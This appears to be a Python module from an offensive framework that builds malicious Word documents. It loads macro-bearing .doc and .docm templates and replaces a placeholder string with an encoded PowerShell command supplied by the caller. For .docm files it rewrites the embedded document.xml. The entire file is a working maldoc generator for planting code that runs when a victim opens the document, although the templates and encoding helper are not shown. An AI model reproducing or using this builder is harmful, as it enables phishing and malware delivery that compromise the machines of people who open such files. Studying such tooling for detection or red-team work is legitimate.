import os
import zipfile
import io
from .utils import *

path = os.path.dirname(__file__)

def vba_replace(vba, ps_command):
    return vba.replace(b'X'*256, ps_encode(ps_command.ljust(96)).encode('utf-8'))

def doc(ps_command, method):
    with open(os.path.join(path, f'templates/vba/{method}.doc'), 'rb') as f:
        doc_file = f.read()
    return vba_replace(doc_file, ps_command)

def docm(ps_command, method):
    docm_file = io.BytesIO()
    with zipfile.ZipFile(os.path.join(path, f'templates/vba/{method}.docm'), "r") as zin, zipfile.ZipFile(docm_file, "w") as zout:
        for item in zin.infolist():
            data = zin.read(item.filename)
            if item.filename == "word/document.xml":
                data = vba_replace(data, ps_command)
            zout.writestr(item, data)
    return docm_file.getvalue()

